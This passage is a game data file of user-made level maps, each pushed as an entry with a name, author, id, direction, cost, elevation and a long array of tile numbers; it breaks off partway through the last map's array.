maps.push({name="Box room and go up",author="FL00D",id="#1667984827",direction="left",cost=215,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,22,22,22,22,22,22,22,22,22,22,22,0,0,10,10,0,2,16,16,16,16,50,50,50,50,50,50,50,50,50,22,0,0,10,10,0,2,16,16,16,16,50,50,50,50,50,50,50,50,50,22,0,0,10,10,0,0,0,0,0,22,50,50,50,50,50,50,50,50,11,22,0,0,10,10,0,0,0,0,0,22,50,50,50,50,50,50,50,50,12,22,0,0,10,10,0,0,0,0,0,22,50,50,50,50,50,50,50,50,13,22,0,0,10,10,0,0,0,0,0,22,50,50,50,50,50,50,50,50,14,22,0,0,10,10,0,0,0,0,0,22,50,50,50,50,50,50,50,50,15,22,0,0,10,10,0,0,0,10,10,50,50,50,50,50,50,50,50,50,16,22,0,0,10,10,0,0,0,10,10,50,50,50,50,50,50,50,50,50,50,22,0,0,10,10,0,0,0,10,0,22,50,50,50,50,50,50,50,50,50,22,0,0,10,10,0,0,0,10,0,22,22,22,22,22,22,22,22,22,22,22,0,0,10,10,0,0,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Dont Touch Water",author="TF2 Pencil",id="#1667984908",direction="left",cost=462,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,13,13,0,0,0,0,1,13,13,76,76,13,76,76,13,76,76,13,13,1,13,13,0,0,0,0,1,13,13,76,76,13,76,76,13,76,76,13,13,1,13,13,0,0,0,0,1,13,13,1,1,1,1,1,1,1,1,1,13,1,13,13,0,0,0,0,1,13,13,13,13,13,13,13,13,13,13,1,13,1,13,13,0,0,0,0,1,76,76,76,76,76,76,76,76,76,13,1,76,1,13,13,0,0,0,0,1,81,81,81,81,81,81,81,81,81,13,1,13,1,13,13,0,0,0,0,1,81,81,81,81,81,81,81,81,81,13,1,13,1,13,13,0,0,0,0,1,13,97,81,81,81,81,81,81,81,13,1,13,1,13,13,0,0,0,0,1,131,13,82,13,81,13,82,13,81,13,1,76,1,13,13,0,0,0,0,1,13,13,82,82,82,82,82,82,82,82,1,13,1,13,13,0,0,0,0,1,82,82,82,82,82,82,82,82,82,82,1,13,1,13,13,0,0,0,0,1,82,82,82,82,82,82,82,82,82,82,1,13,1,13,13,0,0,0,0,1,76,76,76,76,76,76,76,76,76,76,1,76,1,13,13,0,0,2,13,96,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,0,0,2,13,96,13,13,132,13,13,13,13,13,13,13,13,13,13,13,13,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Puller Is Aggressive",author="ZpLit",id="#1668037292",direction="forward",cost=122,elevation=12,map=[94,28,0,0,0,32,0,30,10,2,2,10,30,0,32,0,0,0,28,94,94,28,0,0,0,32,0,30,10,10,10,10,30,0,32,0,0,0,28,94,0,0,0,0,0,0,0,0,0,0,0,30,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,32,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,34,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,36,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,38,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,40,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,129,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,128,0,93,40,0,0,0,44,0,42,22,22,22,22,42,0,44,0,0,0,40,93,93,40,0,0,0,44,0,42,22,2,2,22,42,0,44,0,0,0,40,93]});
maps.push({name="SAM",author="ZpLit",id="#1668076080",direction="left",cost=325,elevation=-3,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,2,2,17,22,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,14,14,21,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,90,19,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,17,21,1,0,14,14,14,14,14,14,14,14,14,14,0,0,1,14,90,14,14,18,1,14,108,108,108,108,108,108,108,108,108,108,14,0,1,14,14,14,90,14,1,14,108,93,108,108,108,108,108,108,94,108,14,0,19,114,114,114,114,114,19,14,108,108,108,108,108,108,108,108,108,108,14,0,18,113,113,113,113,113,18,15,109,109,109,15,14,14,15,109,109,109,15,0,17,112,112,112,112,112,17,16,110,110,110,16,0,0,16,110,110,110,16,16,16,111,111,111,111,111,16,88,111,111,111,16,0,0,16,111,111,111,111,111,111,111,111,111,111,111,16,2,111,111,111,16,0,0,16,111,111,111,111,111,111,111,111,111,111,111,16,2,111,111,111,16,0,0,16,111,111,111,111,111,111,111,111,111,111,111,16,88,111,111,111,16,0,0,16,111,111,111,111,111,111,111,111,111,111,111,16,16,110,110,110,16,0,0,16,110,110,110,16,16,16,111,111,111,111,111,16,15,109,109,109,15,14,14,15,109,109,109,15,0,16,111,111,111,111,111,16,14,108,108,108,108,108,108,108,108,108,108,14,0,16,111,111,113,111,111,16,14,108,93,108,108,108,108,108,108,94,108,14,0,16,111,113,100,113,111,16,14,108,108,108,108,108,108,108,108,108,108,14,0,16,111,111,111,111,111,16,0,14,14,14,14,14,14,14,14,14,14,0,0,0,16,16,16,16,16,0]});
maps.push({name="To The Moon",author="sivi",id="#1668084346",direction="forward",cost=171,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,11,11,1,1,0,0,0,0,0,0,0,1,1,1,5,5,5,5,5,11,11,11,11,1,1,0,0,0,0,0,1,1,131,65,5,5,5,5,5,11,11,11,11,88,1,0,0,0,0,0,1,93,121,65,5,5,5,5,5,11,11,11,11,11,1,0,0,0,0,0,1,93,121,65,5,131,5,5,5,11,132,11,11,88,1,0,0,0,0,0,1,93,121,65,5,5,5,5,5,11,11,11,11,11,1,0,0,0,0,0,1,1,131,65,5,5,5,5,5,11,11,11,11,88,1,0,0,0,0,0,0,1,1,1,5,5,5,5,5,11,11,11,11,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,95,95,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,111,111,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0]});
maps.push({name="ULTRAKILL 1 2",author="ZpLit",id="#1668091353",direction="left",cost=404,elevation=-14,map=[0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,24,2,2,24,0,1,9,8,7,6,5,5,87,1,0,0,0,0,0,24,94,59,59,94,24,1,9,18,16,20,65,65,5,1,0,0,1,1,0,24,59,59,59,59,24,1,10,22,20,18,65,65,5,1,1,1,5,5,1,24,59,59,59,59,24,2,5,6,7,8,7,66,68,68,68,68,68,68,5,24,59,59,59,59,24,2,5,6,7,8,7,66,68,68,68,68,68,68,5,24,59,59,59,59,24,1,10,22,20,18,65,65,5,1,1,1,68,68,1,0,24,58,58,24,0,1,9,18,16,20,65,65,5,1,0,1,68,68,1,0,23,57,57,23,0,1,9,8,7,6,5,5,87,1,0,1,68,68,1,0,22,56,56,22,0,87,1,1,1,1,1,1,1,1,1,1,68,68,1,0,21,55,55,21,0,5,5,105,45,45,45,45,45,45,99,1,68,68,1,0,20,54,54,20,0,5,5,105,45,45,45,98,45,45,45,1,68,68,1,0,19,95,95,19,0,12,12,1,31,1,1,25,1,45,45,98,66,66,1,0,19,54,54,19,0,95,95,1,29,0,27,0,1,87,45,98,66,66,1,0,0,7,7,0,0,95,95,1,1,1,1,1,1,1,1,1,1,1,1,0,0,8,8,0,0,12,12,65,65,8,9,96,29,30,31,32,33,34,0,0,0,9,9,0,0,12,12,65,65,87,8,1,1,1,1,1,1,35,0,0,0,10,10,0,0,11,11,65,65,8,97,117,117,33,34,34,0,36,0,128,35,1,31,0,0,11,11,10,9,8,8,1,1,1,1,1,1,35,0,0,34,33,32,0,0,11,11,10,9,8,96,96,28,26,31,28,29,34,0,0,0,0,0,0,0]});
maps.push({name="Not Required BTW",author="ZpLit",id="#1668145392",direction="left",cost=543,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,14,14,14,14,0,0,0,0,0,0,1,94,135,135,135,135,135,135,135,1,135,135,135,135,1,1,1,1,1,0,1,14,135,135,135,135,135,135,135,1,135,135,135,135,135,135,135,135,135,1,1,94,135,135,135,135,135,135,135,1,135,135,135,135,135,135,135,135,135,1,0,1,135,135,135,1,135,135,135,1,135,135,135,135,135,135,135,135,135,1,0,1,135,135,135,1,135,135,135,1,1,1,1,1,1,1,135,135,135,1,0,1,135,135,135,1,135,135,135,1,54,54,54,54,54,1,135,135,135,1,1,1,135,135,135,1,135,135,135,1,54,88,54,93,54,1,135,135,135,1,2,135,135,135,135,1,135,135,135,1,54,93,54,88,54,1,135,135,135,1,2,135,135,135,135,1,135,135,135,1,54,54,96,54,54,1,135,135,135,1,1,1,135,135,135,1,135,135,135,1,1,1,114,1,1,1,135,135,135,1,0,1,135,135,135,1,135,135,135,135,135,14,14,14,135,135,135,135,135,1,0,1,135,135,135,1,135,135,135,135,135,14,100,14,135,135,135,135,135,1,0,1,135,135,135,1,135,135,135,135,135,14,14,14,135,135,135,135,135,1,0,1,135,135,135,1,1,1,1,1,1,135,135,135,1,1,1,1,1,0,1,94,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,1,14,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,1,94,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Peripheral Peril",author="Soft Serve",id="#1668228428",direction="forward",cost=274,elevation=12,map=[24,87,24,0,0,0,93,17,5,2,2,5,17,93,0,0,92,24,87,24,87,94,24,92,0,0,93,17,5,141,141,5,17,93,0,0,0,24,94,87,24,24,24,0,0,0,93,17,45,11,11,45,17,93,0,0,92,24,24,24,92,0,92,0,0,0,0,0,5,141,141,5,0,0,0,0,0,0,92,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,141,5,5,141,0,0,0,0,0,0,0,0,38,129,0,0,0,0,0,0,19,25,25,19,0,0,0,0,0,0,128,38,38,100,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,100,38,23,23,23,77,0,0,0,0,0,27,27,0,0,0,0,0,77,23,23,23,23,23,23,77,0,0,0,0,0,27,27,0,0,0,0,0,77,23,23,23,38,100,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,100,38,38,129,0,0,0,0,0,0,19,25,25,19,0,0,0,0,0,0,128,38,0,0,0,0,0,0,0,0,141,5,5,141,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,92,0,0,0,0,0,0,141,141,141,141,0,0,0,0,0,92,0,92,24,24,24,92,0,0,23,141,17,17,17,17,141,23,0,0,0,24,24,24,87,94,24,0,0,0,23,141,17,17,17,17,141,23,0,0,92,24,94,87,24,87,24,92,0,0,23,141,17,2,2,17,141,23,0,0,0,24,87,24]});
maps.push({name="Hard Gotten Gains",author="ZpLit",id="#1668242684",direction="forward",cost=162,elevation=0,map=[0,0,0,0,0,0,0,1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,54,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,1,54,54,54,23,23,54,54,54,1,0,0,0,0,0,130,130,34,0,0,94,54,54,23,93,93,23,54,54,94,0,0,34,130,130,130,130,34,0,0,94,54,54,23,93,93,23,54,54,94,0,0,34,130,130,0,0,0,0,0,1,54,91,54,23,23,54,91,54,1,0,0,0,0,0,0,0,0,0,0,0,1,54,54,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,95,95,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1,0,0,0,0,0,0,0]});
maps.push({name="4 Hallways",author="ZpLit",id="#1668243338",direction="forward",cost=198,elevation=0,map=[0,0,0,0,0,1,1,1,114,2,2,114,1,1,1,0,0,0,0,0,0,0,0,0,1,19,19,20,54,54,54,54,20,19,19,1,0,0,0,0,0,0,0,0,1,18,1,1,54,54,54,54,1,1,18,1,0,0,0,0,0,0,0,0,1,17,100,1,54,54,54,54,1,100,17,1,0,0,0,0,0,0,0,0,1,16,1,1,54,54,54,54,1,1,16,1,0,0,0,0,0,0,0,0,1,16,15,14,54,54,54,54,14,15,16,1,0,0,0,0,0,0,0,0,0,1,1,1,54,54,54,54,1,1,1,0,0,0,0,0,0,0,0,0,0,1,94,54,54,54,54,54,54,94,1,0,0,0,0,0,0,0,0,0,0,1,54,54,54,54,54,54,54,54,1,0,0,0,0,0,0,0,0,0,0,1,86,54,1,1,1,1,54,86,1,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,1,54,86,1,0,0,1,86,54,1,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,1,86,54,1,0,0,1,54,86,1,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,1,54,86,1,1,1,1,86,54,1,0,0,0,0,0,0,0,0,0,0,1,54,54,54,14,14,54,54,54,1,0,0,0,0,0,0,0,0,0,0,1,93,54,54,14,14,54,54,93,1,0,0,0,0,0,0,0,0,0,0,0,1,1,88,2,2,88,1,1,0,0,0,0,0,0]});
maps.push({name="Asphyxiation",author="ZpLit",id="#1668244973",direction="left",cost=480,elevation=-16,map=[0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,2,2,0,0,0,0,0,1,5,89,5,5,5,5,5,5,89,5,5,1,21,21,0,0,0,0,0,1,5,5,5,5,5,89,5,5,5,5,5,1,21,21,0,0,0,0,0,1,5,5,89,5,5,5,5,5,5,5,90,1,21,21,0,0,0,0,0,1,5,5,69,69,69,10,69,69,69,89,5,1,21,21,0,0,0,0,0,1,5,89,69,5,69,5,69,5,69,5,5,1,0,127,0,0,0,0,0,1,90,5,69,5,69,5,69,5,69,105,105,1,0,0,0,0,0,0,0,1,5,5,69,5,69,5,69,5,69,105,105,1,0,0,0,0,0,0,0,1,5,5,69,5,69,5,69,5,69,85,85,1,0,0,0,1,1,1,1,1,5,89,69,5,69,5,69,5,69,91,91,1,0,0,0,2,5,10,10,1,5,5,69,5,69,5,69,5,69,105,105,1,0,0,0,2,5,10,91,1,5,5,69,5,69,5,69,5,69,85,85,1,0,0,0,1,5,1,10,1,89,5,69,5,69,5,69,5,69,91,91,1,0,0,0,1,5,1,9,1,5,90,69,5,69,5,69,5,69,105,105,1,0,0,0,1,5,1,8,1,5,5,69,5,69,5,69,5,69,105,105,105,5,5,5,1,5,1,7,1,5,5,69,5,69,5,69,5,69,105,105,105,5,65,5,1,5,1,6,1,96,96,69,5,69,5,69,5,69,1,1,1,5,5,5,1,5,1,5,1,5,5,69,5,69,5,69,1,66,66,66,95,5,5,5,1,100,5,96,97,66,66,66,1,69,69,69,1,66,66,66,95,5,5,5,0,1,1,1,1,1,1,10,0,5,5,5,0,1,1,1,1,5,5,5]});
maps.push({name="RACE racist turn",author="Luffaren",id="#1668245369",direction="right",cost=124,elevation=0,map=[0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE BigJumpBigDream",author="Luffaren",id="#1668245405",direction="forward",cost=84,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="surely i tested map",author="alli",id="#1668253522",direction="forward",cost=402,elevation=0,map=[5,51,51,0,0,0,81,94,81,94,81,0,3,51,51,51,108,108,2,2,6,5,52,51,51,0,81,81,81,81,81,0,90,52,52,52,52,108,108,108,6,6,5,52,52,51,51,51,51,51,51,51,52,53,53,23,23,108,108,108,6,6,6,52,21,1,0,0,0,52,52,52,53,53,23,24,24,23,108,108,5,6,5,52,53,21,5,126,101,0,53,53,54,23,24,5,24,24,108,108,51,5,52,53,54,21,5,1,1,0,54,54,23,24,24,24,1,24,108,108,51,52,53,54,54,21,5,126,101,0,54,23,24,24,24,24,1,24,108,108,0,51,52,53,54,54,21,5,0,54,54,23,24,24,24,24,1,24,108,108,0,0,51,52,53,54,54,21,54,54,23,24,1,24,24,5,5,24,108,108,0,21,21,21,21,21,54,54,54,23,24,24,1,1,24,1,24,24,108,108,0,21,21,21,21,21,54,54,54,23,24,24,1,1,24,1,24,24,108,108,0,0,51,52,53,54,54,21,54,54,23,24,1,24,24,5,5,24,108,108,0,51,52,53,54,54,21,5,0,54,54,23,24,24,24,24,1,24,108,108,51,52,53,54,54,21,5,126,101,0,54,23,24,24,24,24,1,24,108,108,52,5,52,53,54,21,5,1,1,0,54,54,23,24,24,24,1,24,108,108,5,6,5,52,53,21,5,126,101,0,53,53,54,23,24,5,24,24,108,108,6,6,6,52,21,1,0,0,0,52,52,52,53,53,23,24,24,23,108,108,6,6,5,52,51,51,51,51,51,51,51,51,52,53,53,23,23,108,108,108,6,5,52,51,51,0,5,5,5,5,5,0,90,52,52,52,52,108,108,108,5,51,51,0,0,0,5,93,5,93,5,0,3,51,51,51,108,108,2,2]});
maps.push({name="Boxed In",author="sivi",id="#1668259898",direction="forward",cost=554,elevation=0,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,105,105,1,1,1,1,1,1,1,0,0,0,0,1,114,75,77,75,75,75,5,5,75,75,75,77,75,114,1,0,0,0,0,1,114,75,77,90,75,75,5,5,75,75,90,77,75,114,1,0,0,0,0,1,114,75,77,5,75,75,5,5,75,75,94,77,75,114,1,0,0,0,0,1,114,75,77,94,75,75,5,5,75,75,5,77,75,114,1,0,0,0,0,1,114,75,77,90,75,75,5,5,75,75,90,77,75,114,1,0,0,0,0,1,114,75,77,75,75,75,5,5,75,75,75,77,75,114,1,0,0,0,0,1,114,75,77,9,9,5,5,5,5,9,9,77,75,114,1,0,0,0,0,1,114,75,77,93,9,3,5,5,3,9,93,77,75,114,1,0,0,0,0,1,114,75,77,93,9,3,5,5,3,9,93,77,75,114,1,0,0,0,0,1,114,75,77,9,9,5,5,5,5,9,9,77,75,114,1,0,0,0,0,1,114,75,77,75,75,75,5,5,75,75,75,77,75,114,1,0,0,0,0,1,114,75,77,90,75,75,5,5,75,75,90,77,75,114,1,153,11,0,0,1,114,75,77,94,75,75,5,5,75,75,5,77,75,114,1,0,0,0,0,1,114,75,77,5,75,75,5,5,75,75,94,77,75,114,1,154,14,0,0,1,114,75,77,90,75,75,5,5,75,75,90,77,75,114,1,0,0,0,0,1,114,75,77,75,75,75,5,5,75,75,75,77,75,114,1,157,0,0,0,1,1,1,1,1,1,1,105,105,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Never Lucky",author="sivi",id="#1668261696",direction="forward",cost=155,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,5,5,0,0,0,0,5,5,5,5,0,93,93,93,5,0,0,0,0,5,5,5,0,0,0,0,5,94,94,94,0,93,93,93,5,0,0,0,0,0,152,0,0,0,0,0,5,94,94,94,0,93,93,93,5,0,0,0,0,0,0,0,0,0,0,0,5,94,94,94,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,5,131,131,5,0,0,0,0,0,0,0,0,0,0,0,5,131,131,5,0,5,5,5,5,0,145,5,0,0,0,0,0,5,145,0,5,5,5,5,0,0,0,0,0,0,5,199,199,199,199,199,199,199,5,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,9998,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,132,132,132,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,5,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Lap di Carnero",author="Dogeeri",id="#1668261980",direction="forward",cost=187,elevation=8,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,18,17,17,17,16,16,0,0,0,0,0,0,0,10,10,0,0,0,0,18,18,17,17,17,16,16,15,0,0,0,0,0,0,10,10,0,0,0,18,18,18,17,17,17,16,16,15,15,0,0,0,0,0,10,10,0,0,0,18,18,18,17,0,0,16,16,15,15,15,0,0,0,0,10,10,0,0,0,18,18,18,0,0,0,0,16,15,15,15,0,0,0,0,10,10,0,0,0,19,19,19,0,0,0,0,0,14,14,14,0,0,0,0,10,10,10,0,0,19,19,19,0,0,0,0,0,14,14,14,0,0,0,0,10,10,10,0,0,19,19,19,0,0,0,0,0,14,14,14,0,0,0,0,10,10,10,0,0,19,19,0,0,0,0,0,12,13,13,13,0,0,0,0,11,11,11,11,0,19,19,0,0,0,0,12,12,13,13,13,0,0,0,0,11,11,11,11,11,185,185,11,11,11,12,12,12,13,13,13,0,0,0,0,11,11,11,11,11,185,185,11,11,11,12,12,12,13,13,0,0,0,0,0,0,11,11,11,11,185,185,11,11,11,12,12,12,13,0,0,0,0,0,0,0,0,11,11,11,185,185,11,11,11,12,12,12,0,0,0,0,0,0,0,0,0,0,11,11,185,185,11,11,11,12,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,2,2,18,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Sliding Walls",author="sivi",id="#1668268766",direction="forward",cost=198,elevation=0,map=[0,0,0,0,0,0,1,105,105,2,2,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,90,105,105,90,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,9998,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,124,148,0,0,0,0,0,124,0,0,0,0,0,0,0,0,0,0,0,0,1,9998,105,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,90,105,105,90,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,105,9998,1,0,0,0,0,0,0,0,0,0,0,0,0,124,0,0,0,0,0,148,124,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,105,9998,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,90,105,105,90,105,1,0,0,0,0,0,0,0,0,0,0,0,0,1,9998,105,105,105,105,105,1,0,0,0,0,0,0,0,0